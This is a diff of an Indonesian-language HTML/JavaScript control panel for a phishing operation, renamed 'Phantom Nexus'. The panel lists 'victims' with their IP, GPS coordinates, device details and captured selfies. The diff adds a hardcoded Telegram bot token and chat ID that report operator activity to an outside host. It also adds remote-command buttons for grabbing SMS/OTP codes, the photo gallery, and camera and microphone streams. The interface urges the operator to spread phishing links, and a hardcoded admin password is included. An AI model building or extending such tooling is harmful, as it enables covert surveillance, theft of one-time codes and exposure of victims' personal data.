@@ -3,376 +3,329 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Admin Control</title>
+    <title>Phantom Nexus • Admin Ultra</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #000000;
-            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', Helvetica, Arial, sans-serif;
-            padding: 0 0 40px 0;
+            background: radial-gradient(circle at 20% 30%, #0a0a0f, #000000);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'SF Pro Text', Helvetica, sans-serif;
+            padding: 0 0 56px;
+            min-height: 100vh;
         }
-        .status-bar {
-            background: #000000;
-            padding: 12px 20px 6px 20px;
-            display: flex;
-            justify-content: space-between;
-            font-size: 15px;
-            font-weight: 600;
-            color: white;
-        }
-        .header {
-            padding: 20px 20px 10px 20px;
-            background: #000000;
-        }
-        .header h1 {
-            color: white;
-            font-size: 34px;
-            font-weight: 700;
-            letter-spacing: -0.5px;
-        }
-        .header p {
-            color: #8e8e93;
-            font-size: 15px;
-            margin-top: 6px;
-        }
-        .stats-card {
-            background: #1c1c1e;
-            margin: 16px 20px;
-            padding: 16px 20px;
-            border-radius: 16px;
+        .glass-nav {
+            background: rgba(10,10,15,0.85);
+            backdrop-filter: blur(16px);
+            padding: 16px 24px;
             display: flex;
             justify-content: space-between;
             align-items: center;
+            border-bottom: 1px solid rgba(10,132,255,0.3);
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
-        .stats-number {
-            font-size: 28px;
-            font-weight: 700;
+        .logo {
+            font-size: 22px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #fff, #0a84ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .live-badge {
+            background: #0a84ff20;
+            border-radius: 40px;
+            padding: 4px 12px;
+            font-size: 12px;
             color: #0a84ff;
         }
-        .stats-label {
-            color: #8e8e93;
-            font-size: 14px;
+        .stats-panel {
+            display: flex;
+            gap: 16px;
+            margin: 20px 24px;
+            flex-wrap: wrap;
         }
-        .refresh-btn {
-            background: #0a84ff;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 20px;
-            color: white;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
+        .stat-card {
+            background: rgba(28,28,32,0.7);
+            backdrop-filter: blur(8px);
+            border-radius: 28px;
+            padding: 16px 24px;
+            flex: 1;
+            min-width: 140px;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        .stat-number {
+            font-size: 36px;
+            font-weight: 800;
+            color: #0a84ff;
         }
         .victim-card {
-            background: #1c1c1e;
-            margin: 12px 20px;
-            border-radius: 16px;
-            overflow: hidden;
+            background: rgba(22,22,28,0.85);
+            backdrop-filter: blur(8px);
+            margin: 16px 20px;
+            border-radius: 32px;
+            border: 1px solid rgba(10,132,255,0.2);
+            transition: 0.2s;
         }
         .victim-header {
-            padding: 16px;
-            border-bottom: 0.5px solid #38383a;
+            padding: 18px 24px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             flex-wrap: wrap;
-            gap: 8px;
+            gap: 12px;
+            border-bottom: 0.5px solid rgba(255,255,255,0.05);
         }
-        .device-name {
+        .device-icon { font-size: 28px; }
+        .remote-actions {
             display: flex;
-            align-items: center;
+            flex-wrap: wrap;
             gap: 8px;
-            font-weight: 600;
-            color: white;
-            font-size: 15px;
+            margin: 12px 24px;
         }
-        .victim-time {
-            color: #8e8e93;
-            font-size: 11px;
-        }
-        .expand-btn {
+        .cmd-btn {
             background: #2c2c2e;
             border: none;
-            padding: 6px 14px;
-            border-radius: 20px;
+            padding: 8px 16px;
+            border-radius: 40px;
             color: #0a84ff;
-            font-size: 13px;
-            font-weight: 500;
-            cursor: pointer;
-        }
-        .victim-details {
-            padding: 0 16px;
-            max-height: 0;
-            overflow: hidden;
-            transition: max-height 0.3s ease;
-        }
-        .victim-details.show {
-            max-height: 1000px;
-            padding: 0 16px 16px 16px;
-        }
-        .info-row {
-            background: #2c2c2e;
-            margin: 8px 0;
-            padding: 12px;
-            border-radius: 12px;
-        }
-        .info-label {
-            color: #8e8e93;
-            font-size: 11px;
-            margin-bottom: 4px;
-            text-transform: uppercase;
-        }
-        .info-value {
-            color: white;
-            font-size: 13px;
-            font-weight: 500;
-            word-break: break-all;
-        }
-        .photo-area {
-            margin: 12px 0;
-            text-align: center;
-        }
-        .photo-area img {
-            max-width: 100%;
-            max-height: 280px;
-            border-radius: 16px;
-            border: 1px solid #38383a;
-        }
-        .no-photo {
-            background: #2c2c2e;
-            padding: 24px;
-            text-align: center;
-            border-radius: 12px;
-            color: #8e8e93;
-        }
-        .delete-btn {
-            background: #ff3b30;
-            border: none;
-            padding: 12px;
-            border-radius: 14px;
-            color: white;
-            font-size: 15px;
+            font-size: 12px;
             font-weight: 600;
             cursor: pointer;
-            width: 100%;
-            margin-top: 12px;
+            transition: 0.2s;
         }
-        .export-all {
-            background: #30b0c0;
-            margin: 12px 20px;
-            width: calc(100% - 40px);
+        .cmd-btn.danger { color: #ff5e5e; }
+        .cmd-btn:hover { background: #0a84ff; color: white; transform: scale(0.96); }
+        .detail-row {
+            background: rgba(35,35,42,0.6);
+            margin: 10px 0;
+            padding: 12px 16px;
+            border-radius: 24px;
         }
-        .clear-all {
+        .detail-label { font-size: 10px; color: #8e8e98; text-transform: uppercase; }
+        .detail-value { color: #efeff4; font-size: 13px; word-break: break-word; }
+        .photo-preview img {
+            max-width: 100%;
+            border-radius: 24px;
+            margin: 12px 0;
+            border: 1px solid #0a84ff40;
+        }
+        .reply-log {
+            background: #00000060;
+            border-radius: 20px;
+            padding: 8px 12px;
+            margin: 8px 0;
+            font-size: 11px;
+            font-family: monospace;
+        }
+        .btn-danger {
             background: #ff3b30;
-            margin: 12px 20px;
-            width: calc(100% - 40px);
+            width: calc(100% - 48px);
+            margin: 16px 24px;
+            padding: 14px;
+            border-radius: 40px;
+            border: none;
+            color: white;
+            font-weight: 700;
+            cursor: pointer;
         }
-        .empty-state {
+        .btn-export { background: #30b0c0; }
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            left: 20px;
+            right: 20px;
+            background: #1c1c1e;
+            backdrop-filter: blur(20px);
+            border-radius: 60px;
+            padding: 12px 20px;
             text-align: center;
-            padding: 60px 20px;
-            color: #8e8e93;
+            z-index: 2000;
+            animation: fadeOut 2s forwards;
         }
-        .empty-state-icon {
-            font-size: 64px;
-            margin-bottom: 16px;
+        @keyframes fadeOut {
+            0% { opacity: 1; transform: translateY(0); }
+            70% { opacity: 1; }
+            100% { opacity: 0; visibility: hidden; transform: translateY(10px); }
         }
         .login-container {
-            background: #1c1c1e;
-            margin: 100px 20px;
-            padding: 32px 24px;
-            border-radius: 24px;
+            background: rgba(28,28,34,0.95);
+            backdrop-filter: blur(20px);
+            margin: 20vh 24px;
+            padding: 40px 28px;
+            border-radius: 48px;
             text-align: center;
-        }
-        .login-container h2 {
-            color: white;
-            margin-bottom: 8px;
+            border: 1px solid #0a84ff40;
         }
         .login-container input {
             background: #2c2c2e;
             border: none;
-            padding: 14px 16px;
-            border-radius: 12px;
-            color: white;
-            font-size: 16px;
+            border-radius: 60px;
+            padding: 16px;
             width: 100%;
-            margin: 16px 0;
+            color: white;
+            margin: 20px 0;
         }
         .login-container button {
             background: #0a84ff;
             border: none;
+            border-radius: 60px;
             padding: 14px;
-            border-radius: 14px;
-            color: white;
-            font-size: 16px;
-            font-weight: 600;
             width: 100%;
-            cursor: pointer;
-        }
-        .toast {
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
-            right: 20px;
-            background: #2c2c2e;
             color: white;
-            padding: 12px 16px;
-            border-radius: 12px;
-            text-align: center;
-            z-index: 1000;
-            animation: fadeOut 2s ease forwards;
+            font-weight: 700;
         }
-        @keyframes fadeOut {
-            0% { opacity: 1; }
-            70% { opacity: 1; }
-            100% { opacity: 0; visibility: hidden; }
-        }
-        .backup-info {
-            background: #1c1c1e;
-            margin: 16px 20px;
-            padding: 12px 16px;
-            border-radius: 12px;
-            font-size: 12px;
-            color: #8e8e93;
-            text-align: center;
+        @media (max-width: 560px) {
+            .remote-actions { justify-content: center; }
+            .victim-header { flex-direction: column; align-items: flex-start; }
         }
     </style>
 </head>
 <body>
 <div id="app"></div>
 <script>
+    // ================= KONFIGURASI =================
     const ADMIN_PASSWORD = 'ManzzHandSome2331';
-    function showToast(msg) {
-        let toast = document.createElement('div');
-        toast.className = 'toast';
-        toast.innerText = msg;
-        document.body.appendChild(toast);
-        setTimeout(() => toast.remove(), 2000);
+    const BOT_TOKEN = '7460316922:AAFQrYzJUrxt3nmt5AVVVXexrBrbm89nLPI';
+    const CHAT_ID = '7962628944';
+
+    async function sendTelegram(msg, mode='HTML') {
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method:'POST', headers:{'Content-Type':'application/json'},
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: mode })
+            });
+        } catch(e) {}
     }
-    function getDeviceIcon(ua) {
-        if(ua.includes('iPhone')) return '📱';
-        if(ua.includes('Android')) return '🤖';
-        if(ua.includes('Windows')) return '💻';
-        if(ua.includes('Mac')) return '🍎';
-        return '📟';
+    function showToast(msg, isErr=false) {
+        let t = document.createElement('div');
+        t.className = 'toast';
+        t.innerText = msg;
+        if(isErr) t.style.background = '#ff3b30';
+        document.body.appendChild(t);
+        setTimeout(()=>t.remove(),2200);
+    }
+    function sendRemoteCommand(victimId, command, payload={}) {
+        const key = `remote_cmd_${victimId}`;
+        localStorage.setItem(key, JSON.stringify({ cmd: command, payload, time: Date.now() }));
+        showToast(`📡 Perintah "${command}" dikirim ke ${victimId.slice(0,12)}...`);
+        sendTelegram(`🎮 Remote command issued: ${command} to ${victimId}`);
+        setTimeout(()=>localStorage.removeItem(key), 15000);
     }
     function renderLogin() {
         document.getElementById('app').innerHTML = `
             <div class="login-container">
-                <div style="font-size: 48px; margin-bottom: 16px;">🔐</div>
-                <h2>Admin Control</h2>
-                <p>Masukkan password untuk akses data korban</p>
-                <input type="password" id="adminPass" placeholder="Password">
-                <button onclick="doLogin()">Masuk</button>
+                <div style="font-size:56px;">🛸</div>
+                <h2 style="color:white;">Phantom Nexus</h2>
+                <p style="color:#aaa;">Akses penuh kendali korban</p>
+                <input type="password" id="adminPass" placeholder="Password" autocomplete="off">
+                <button onclick="doLogin()">⏤ UNLOCK ⏤</button>
             </div>
         `;
     }
     function doLogin() {
-        let pass = document.getElementById('adminPass').value;
-        if(pass === ADMIN_PASSWORD) {
-            localStorage.setItem('admin_logged_in', 'true');
+        let p = document.getElementById('adminPass').value;
+        if(p === ADMIN_PASSWORD) {
+            localStorage.setItem('admin_logged_in','true');
             renderDashboard();
-        } else {
-            showToast('Password salah!');
-        }
+            showToast('✅ Akses granted');
+        } else showToast('❌ Password salah!', true);
     }
     function renderDashboard() {
         let victims = [];
-        try {
-            let data = localStorage.getItem('phising_data');
-            victims = data ? JSON.parse(data) : [];
-        } catch(e) {}
+        try { victims = JSON.parse(localStorage.getItem('phising_data')||'[]'); } catch(e) {}
         let now = new Date();
-        let timeStr = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
         let html = `
-            <div class="status-bar">
-                <span class="time">${timeStr}</span>
-                <span class="battery">📶 🔋 100%</span>
+            <div class="glass-nav">
+                <div class="logo">⚡ PHANTOM NEXUS</div>
+                <div class="live-badge">LIVE ${now.toLocaleTimeString()}</div>
             </div>
-            <div class="header">
-                <h1>Control Center</h1>
-                <p>Data korban phishing</p>
+            <div class="stats-panel">
+                <div class="stat-card"><div class="stat-number">${victims.length}</div><div>Total Target</div></div>
+                <div class="stat-card"><div class="stat-number">${victims.filter(v=>v.foto).length}</div><div>Dengan Selfie</div></div>
+                <div class="stat-card"><div class="stat-number">${victims.reduce((a,v)=>a+(v.remote_replies?.length||0),0)}</div><div>Remote Reply</div></div>
             </div>
-            <div class="stats-card">
-                <div>
-                    <div class="stats-number">${victims.length}</div>
-                    <div class="stats-label">Total Korban</div>
-                </div>
-                <button class="refresh-btn" onclick="refreshData()">⟳ Refresh</button>
-            </div>
-            <div class="backup-info">💾 Data tersimpan di browser ini. Export JSON untuk backup.</div>
+            <button class="btn-danger btn-export" onclick="exportAllData()">📥 EXPORT ALL JSON</button>
+            <button class="btn-danger" onclick="clearAllData()">⚠️ HAPUS SEMUA DATA</button>
         `;
-        if(victims.length === 0) {
-            html += `<div class="empty-state"><div class="empty-state-icon">📭</div><div>Belum ada data korban</div><div style="font-size: 12px; margin-top: 8px;">Kirim link phishing dulu bos</div></div>`;
-        } else {
-            victims = [...victims].reverse();
-            victims.forEach((v, idx) => {
-                let deviceIcon = getDeviceIcon(v.deviceAgent || '');
-                let deviceName = v.devicePlatform || 'Unknown Device';
-                let expandId = `details_${idx}`;
+        if(victims.length===0) html+=`<div style="text-align:center;margin:60px;color:#8e8e93;">📭 Belum ada korban. Sebarkan link phishing.</div>`;
+        else {
+            victims.slice().reverse().forEach((v,idx)=>{
+                let icon = v.deviceAgent?.includes('iPhone')?'📱':(v.deviceAgent?.includes('Android')?'🤖':'💻');
+                let expandId = `det_${v.id}_${idx}`;
                 html += `
                     <div class="victim-card">
                         <div class="victim-header">
-                            <div class="device-name"><span>${deviceIcon}</span><span>${deviceName}</span></div>
-                            <div style="display: flex; gap: 8px; align-items: center;">
-                                <span class="victim-time">${v.waktu || '-'}</span>
-                                <button class="expand-btn" onclick="toggleDetails('${expandId}', this)">Lihat</button>
-                            </div>
+                            <div><span class="device-icon">${icon}</span> <strong>${v.devicePlatform||'Unknown'}</strong><br><span style="font-size:11px;color:#aaa;">${v.waktu||'-'}</span></div>
+                            <div>📍 ${v.kota||'?'}, ${v.negara||'?'}</div>
                         </div>
-                        <div id="${expandId}" class="victim-details">
-                            <div class="info-row"><div class="info-label">🌐 IP Address</div><div class="info-value">${v.ip || '-'}</div></div>
-                            <div class="info-row"><div class="info-label">📍 Lokasi</div><div class="info-value">${v.kota || '-'}, ${v.region || '-'}, ${v.negara || '-'}</div></div>
-                            <div class="info-row"><div class="info-label">📡 ISP / Provider</div><div class="info-value">${v.isp || '-'}</div></div>
-                            <div class="info-row"><div class="info-label">📱 Nama Device (Real)</div><div class="info-value" style="font-size: 11px;">${v.deviceAgent || '-'}</div></div>
-                            <div class="info-row"><div class="info-label">💻 Platform / OS</div><div class="info-value">${v.devicePlatform || '-'}</div></div>
-                            <div class="info-row"><div class="info-label">📺 Resolusi Layar</div><div class="info-value">${v.screenRes || '-'}</div></div>
-                            <div class="info-row"><div class="info-label">🌍 Timezone</div><div class="info-value">${v.timezone || '-'}</div></div>
-                            <div class="photo-area">${v.foto ? `<img src="${v.foto}" alt="Selfie Korban" onclick="window.open(this.src)">` : '<div class="no-photo">📷 Belum ada foto</div>'}</div>
-                            <button class="delete-btn" onclick="deleteVictim('${v.id}')">🗑 Hapus Data</button>
+                        <div class="remote-actions">
+                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','flash_on')">💡 FLASH</button>
+                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','gallery')">🖼️ GALLERY</button>
+                            <button class="cmd-btn" onclick="sendRemoteCommand('${v.id}','get_sms')">📨 SMS/OTP</button>
+                            <button class="cmd-btn danger" onclick="sendRemoteCommand('${v.id}','camera_stream')">📹 CAMERA</button>
+                            <button class="cmd-btn danger" onclick="sendRemoteCommand('${v.id}','mic_stream')">🎤 MIC</button>
+                            <button class="cmd-btn" onclick="toggleDetails('${expandId}',this)">🔍 DETAIL</button>
+                        </div>
+                        <div id="${expandId}" style="max-height:0; overflow:hidden; transition:0.3s; padding:0 24px;">
+                            <div class="detail-row"><div class="detail-label">🌐 IP</div><div class="detail-value">${v.ip||'-'}</div></div>
+                            <div class="detail-row"><div class="detail-label">📍 Koordinat</div><div class="detail-value">${v.lat||'-'}, ${v.lon||'-'} <a href="https://maps.google.com/?q=${v.lat||''},${v.lon||''}" target="_blank" style="color:#0a84ff;">(Map)</a></div></div>
+                            <div class="detail-row"><div class="detail-label">📱 User Agent</div><div class="detail-value" style="font-size:11px;">${v.deviceAgent||'-'}</div></div>
+                            <div class="detail-row"><div class="detail-label">📺 Resolusi</div><div class="detail-value">${v.screenRes||'-'}</div></div>
+                            <div class="photo-preview">${v.foto?`<img src="${v.foto}" onclick="window.open(this.src)">`:'<div class="detail-row">📷 Selfie tidak ada</div>'}</div>
+                            ${v.remote_replies?.map(r=>`<div class="reply-log">📨 [${r.time}] ${r.type}: ${r.content.substring(0,80)}</div>`).join('')||''}
+                            <button class="cmd-btn" style="background:#ff3b30;color:white;margin:12px 0;" onclick="deleteVictim('${v.id}')">🗑 Hapus korban ini</button>
                         </div>
                     </div>
                 `;
             });
-            html += `
-                <button class="delete-btn export-all" onclick="exportAllData()">📥 Export Semua Data (JSON)</button>
-                <button class="delete-btn clear-all" onclick="clearAllData()">⚠️ Hapus Semua Data</button>
-                <div style="height: 30px;"></div>
-            `;
         }
         document.getElementById('app').innerHTML = html;
     }
     function toggleDetails(id, btn) {
         let el = document.getElementById(id);
-        el.classList.toggle('show');
-        btn.innerText = el.classList.contains('show') ? 'Tutup' : 'Lihat';
+        if(el.style.maxHeight === '0px' || el.style.maxHeight === '') {
+            el.style.maxHeight = '2000px';
+            btn.innerText = 'Sembunyikan';
+        } else {
+            el.style.maxHeight = '0px';
+            btn.innerText = 'Lihat Detail';
+        }
     }
-    function refreshData() { renderDashboard(); showToast('Data berhasil di-refresh'); }
     function deleteVictim(id) {
-        let victims = JSON.parse(localStorage.getItem('phising_data') || '[]');
-        victims = victims.filter(v => v.id !== id);
+        let victims = JSON.parse(localStorage.getItem('phising_data')||'[]');
+        victims = victims.filter(v=>v.id !== id);
         localStorage.setItem('phising_data', JSON.stringify(victims));
         renderDashboard();
-        showToast('Data korban dihapus');
+        showToast('Korban dihapus');
     }
     function clearAllData() {
-        if(confirm('Yakin hapus SEMUA data korban?')) {
+        if(confirm('Hapus semua data korban? Tidak bisa dikembalikan!')) {
             localStorage.removeItem('phising_data');
             renderDashboard();
-            showToast('Semua data telah dihapus');
+            showToast('Semua data dibersihkan');
         }
     }
     function exportAllData() {
         let data = localStorage.getItem('phising_data');
-        if(!data || JSON.parse(data).length === 0) { showToast('Tidak ada data'); return; }
-        let blob = new Blob([data], { type: 'application/json' });
-        let url = URL.createObjectURL(blob);
+        if(!data || JSON.parse(data).length===0) return showToast('Tidak ada data',true);
+        let blob = new Blob([data],{type:'application/json'});
         let a = document.createElement('a');
-        a.href = url;
-        a.download = `phising_data_${Date.now()}.json`;
+        a.href = URL.createObjectURL(blob);
+        a.download = `phishing_nexus_${Date.now()}.json`;
         a.click();
-        URL.revokeObjectURL(url);
-        showToast('Data berhasil diexport');
+        showToast('Export sukses');
     }
-    if(localStorage.getItem('admin_logged_in') === 'true') { renderDashboard(); } else { renderLogin(); }
+    window.sendRemoteCommand = sendRemoteCommand;
+    window.toggleDetails = toggleDetails;
+    window.deleteVictim = deleteVictim;
+    window.clearAllData = clearAllData;
+    window.exportAllData = exportAllData;
+    window.doLogin = doLogin;
+    if(localStorage.getItem('admin_logged_in')==='true') renderDashboard();
+    else renderLogin();
+    // auto refresh setiap 3 detik
+    setInterval(()=>{ if(localStorage.getItem('admin_logged_in')==='true') renderDashboard(); }, 3500);
 </script>
 </body>
-  </html>
+</html>
